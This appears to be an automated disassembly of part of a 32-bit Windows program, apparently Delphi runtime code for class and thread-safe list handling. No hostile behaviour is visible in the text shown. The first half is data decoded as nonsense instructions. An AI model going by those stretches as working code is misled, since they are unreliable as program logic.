or al 0x32
imul ebp [ esi + 0x67 ] 0x7473694c
inc esp
add [ ecx ] 0x7
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
lodsb [ esi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax ] dh
mov edx 0xba640041
inc ecx
add [ eax - 0x46 ] ch
inc ecx
add [ edx + edi * 4 + 0x41 ] ch
add [ eax - 0x51 ] al
inc ecx
add al ah
mov ebx 0xbc3c0041
inc ecx
add [ eax ] dl
mov ebp 0xb6000041
inc ecx
add [ ebp + edi * 4 + 0x41 ] cl
add al al
mov ebp 0xb7e40041
inc ecx
add al dh
mov bh 0x41
add [ edx + ebp * 4 - 0x4773ffbf ] bl
inc ecx
add ah cl
mov eax 0xb9380041
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add al cl
mov edx 0xb0f40041
inc ecx
add al cl
mov cl 0x41
add [ ebx + edi * 4 ] al
inc ecx
add [ ebx + edi * 4 ] dl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add [ eax + 0x2c0041b2 ] al
mov bl 0x41
add ah al
mov ah 0x41
add [ esi * 4 - 0x4a4fffbf ] bl
inc ecx
add [ eax + edi * 4 + 0x41 ] dl
add [ eax - 0x48 ] dh
inc ecx
add [ eax - 0x45 ] ch
inc ecx
add [ eax + 0x780041b9 ] bh
mov ebp 0xbd880041
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
push ebx
je r-xdata
popad
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ edi + edi * 4 ] dl
inc ecx
add [ eax + 0x70041bf ] bl
push esp
push ebx
je r-xdata
adc [ esi - 0x41a3ffbf ] bh
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or [ edx + 0x41 ] al
pop es
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
pushfd
test [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x8004184
add [ eax ] al
add al bl
add [ ecx ] 0x64
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] ch
les eax [ ecx ]
adc [ esi - 0x3dabffbf ] bh
inc ecx
add [ eax - 0x3e ] ch
inc ecx
add [ eax ] cl
retn 0x41
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
adc [ ebp + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x85
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x7d ] ch
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] dl
mov esi 0xbe5c0041
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add [ edx + ebp ] bl
inc eax
add [ esp + eax * 8 - 0x4067ffbf ] bl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] ch
retn 0x41
insd
and al 0x84
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] al
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x7d ] ch
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] dl
mov esi 0xc2540041
inc ecx
add [ eax - 0x3e ] ch
inc ecx
add [ eax ] cl
retn 0x41
popad
inc eax
add [ eax ] dl
mov esi 0xbe5c0041
add [ ebp - 0x7c4bffc0 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ ecx ] 0x4
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
jns r-xdata
push ebx
je r-xdata
cwde
mov edi 0xc5900041
inc ecx
add [ 0x6d654d54 ] cl
je r-xdata
adc [ esi - 0x41a3ffbf ] bh
je r-xdata
outsd
jb r-xdata
insd
popad
insd
mov [ ebp + 0x41 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
test [ ecx ] eax
adc al 0x0
add [ eax ] al
les eax [ ecx + eax * 2 + 0x40346400 ]
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add al al
les eax [ ecx ]
adc [ esi - 0x3a9bffbf ] bh
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add [ esi + eax * 8 ] bl
inc ecx
add [ esp + eax * 8 - 0x4067ffbf ] bl
inc ecx
add [ eax + 0xd0041c5 ] dl
push esp
dec ebp
push ebx
push ebx
inc ecx
add [ eax - 0x6fffbe41 ] bl
lds eax [ ecx ]
or eax 0x6d654d54
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add al bl
mov [ ecx ] sub_41c49c
cwde
mov edi 0x540f0041
push edx
jae r-xdata
popad
insd
mov eax eax
or [ esi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x86
inc ecx
add [ eax ] bl
add [ eax ] al
add ah al
test [ ecx ] al
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x100041c7 ] ah
mov esi 0xbe5c0041
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_418440
or eax 0x6e614854
insb
push ebx
je r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
pushfd
test [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x8004184
add [ eax ] al
add al bl
add [ ecx ] 0x64
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] ch
les eax [ ecx ]
adc [ esi - 0x3dabffbf ] bh
inc ecx
add [ eax - 0x3e ] ch
inc ecx
add [ eax ] cl
retn 0x41
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
adc [ ebp + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x85
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x7d ] ch
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] dl
mov esi 0xbe5c0041
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add [ edx + ebp ] bl
inc eax
add [ esp + eax * 8 - 0x4067ffbf ] bl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
jns r-xdata
push ebx
je r-xdata
cwde
mov edi 0xc5900041
inc ecx
add [ 0x6d654d54 ] cl
je r-xdata
adc [ esi - 0x41a3ffbf ] bh
je r-xdata
outsd
jb r-xdata
insd
popad
insd
mov [ ebp + 0x41 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
test [ ecx ] eax
adc al 0x0
add [ eax ] al
les eax [ ecx + eax * 2 + 0x40346400 ]
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add al al
les eax [ ecx ]
adc [ esi - 0x3a9bffbf ] bh
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add [ esi + eax * 8 ] bl
inc ecx
add [ esp + eax * 8 - 0x4067ffbf ] bl
inc ecx
add [ eax + 0xd0041c5 ] dl
push esp
dec ebp
push ebx
push ebx
inc ecx
add [ eax - 0x6fffbe41 ] bl
lds eax [ ecx ]
or eax 0x6d654d54
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ esi + edi * 4 + 0x41 ] dh
add [ esp + eax * 8 + 0x41 ] ah
add al bl
mov [ ecx ] sub_41c49c
cwde
mov edi 0x540f0041
push edx
jae r-xdata
popad
insd
mov eax eax
or [ esi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x86
inc ecx
add [ eax ] bl
add [ eax ] al
add ah al
test [ ecx ] al
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x100041c7 ] ah
mov esi 0xbe5c0041
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_418a0e
leave
mov [ ecx ] eax
xlat
mov [ ecx ] eax
loope r-xdata
add [ edi ] eax
call 0xffffffffe3e84319
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
inc ecx
add cl al
mov [ ecx ] eax
jmp r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
mov esp 0x616c4307
jae r-xdata
adc [ edx + 0x4fc000b1 ] ebp
mov cl 0x6f
dec [ ebx - 0x3f7c3340 ]
fsubr st1
cmp [ ecx ] 0x0
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
add bh bh
sub_418a6c
sub cl [ edx + 0x41 ]
add [ eax ] al
in al 0x8a
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
mov al [ ecx ]
pop eax
mov eax [ ecx ]
xor [ eax ] al
add [ eax ] al
inc esp
jg r-xdata
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x240041fb ] cl
test al 0x41
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
sub_418b13
push ecx
push eax
inc [ eax - 0x1 ]
inc ecx
add [ eax - 0x1 ] cl
inc ecx
add [ edi + edi * 8 + 0x41 ] cl
add [ edi + edi * 8 + 0x41 ] ah
add [ eax + 0x680041ff ] bl
inc [ ecx ]
jo r-xdata
inc [ ecx ]
je r-xdata
inc ecx
add [ edi + edi * 8 + 0x41 ] dh
inc ecx
add [ edx + eax + 0x540a0042 ] al
inc ebx
outsd
insd
jo r-xdata
inc [ ecx ]
cmp bh 0x41
add [ eax + eax ] ch
inc edx
add [ eax ] al
inc edx
add [ edx + eax + 0x42 ] bl
add [ edi + edi * 8 + 0x41 ] ch
add [ eax - 0x1 ] dl
inc ecx
add [ edi + edi * 8 ] bh
add [ eax + 0x2c0041ff ] al
add [ edx ] al
inc eax
add [ edx ] al
pop esp
add al [ edx ]
insb
inc [ ecx ]
push eax
inc [ ecx ]
cmp al 0xff
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x8c
outsb
outsb
je r-xdata
add [ eax ] al
adc [ eax ] al
std
push 0x700418b
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 ] dh
outsb
outsb
je r-xdata
inc [ ecx ]
push 0x700041ff
mov al [ ecx ]
mov eax 0x200417f
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x6bffbdfd ] bl
add eax [ edx ]
int3
jae r-xdata
mov [ ecx ] eax
or [ eax ] al
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
popad
insd
push esp
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
adc al 0x8c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 + 0x41 ] dh
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
sub_418d40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4061b0
pop edi
pop esi
pop ebx
retn
sub_418d68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406194
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418d90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4061b8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418e88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_41a19c
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403448
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403448
test al al
je r-xdata
sub_418ee8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418e88
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418e88
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403448
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_418f58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4031ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41a040
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_418fd4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
mov eax [ esi + 0x4 ]
call sub_40321c
mov eax [ esi + 0x8 ]
call sub_40321c
mov eax [ esi + 0xc ]
call sub_40321c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_419014
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_41a19c
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403180
test al al
jne r-xdata
sub_419074
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_41a19c
mov edx eax
mov eax ebp
call sub_403448
test al al
jne r-xdata
sub_4190b8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419153
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40316c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419014
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41915a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
sub_419178
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405354
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_419198
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a19c
mov edx edi
call sub_419178
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a19c
mov edx edi
call sub_419178
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a08c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_419178
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a08c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_41923c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_41a19c
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_419074
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_419288
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f58
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a040
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4192fc
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403590
mov eax [ esi + 0x4 ]
mov edx edi
call sub_41a19c
call sub_40321c
inc edi
dec ebp
jne r-xdata
sub_419358
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_41a19c
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_418ee8
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_41939c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_419014
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_41a19c
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4193e0
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_419463
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40316c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41946a
lea eax [ ebp - 0x10c ]
call sub_403f6c
retn
sub_419470
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419358
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_418e7c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4193e0
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_41a19c
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a19c
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403448
test al al
je r-xdata
